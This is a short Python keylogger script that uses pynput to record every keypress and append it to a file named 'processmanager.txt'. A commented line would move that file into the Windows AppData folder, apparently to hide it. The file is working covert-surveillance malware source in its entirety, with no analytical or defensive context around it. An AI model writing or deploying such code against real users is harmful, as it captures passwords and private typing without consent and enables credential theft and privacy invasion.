import os
from pynput.keyboard import Listener

keys = []
count = 0
#path = os.environ['appdata'] + '\\processmanager.txt'
path = 'processmanager.txt'

def on_press(key):
    global keys,count
    keys.append(key)
    count += 1

    if count >= 1:
        count = 0
        write_file(keys)
        keys = []

def write_file (keys):
    with open(path,'a') as f:
        current_position=f.tell()
        for key in keys:
            k= str(key).replace("'","")
            if k.find('backspace') > 0:
                if current_position > 0:
                    # Move the file cursor back by 1 character
                    f.seek(current_position - 1)
                    f.truncate()  # Remove the last appended character
                    current_position -= 1
            elif k.find('enter') > 0:
                f.write('\n')
            elif k.find('shift') > 0:
                f.write('shift ')
            elif k.find('space') > 0:
                f.write(' ')
            elif k.find('caps_lock') > 0:
                f.write(' caps_lock ')
            elif k.find('key'):
                f.write(k)


with Listener(on_press=on_press) as listener:
    listener.join()
    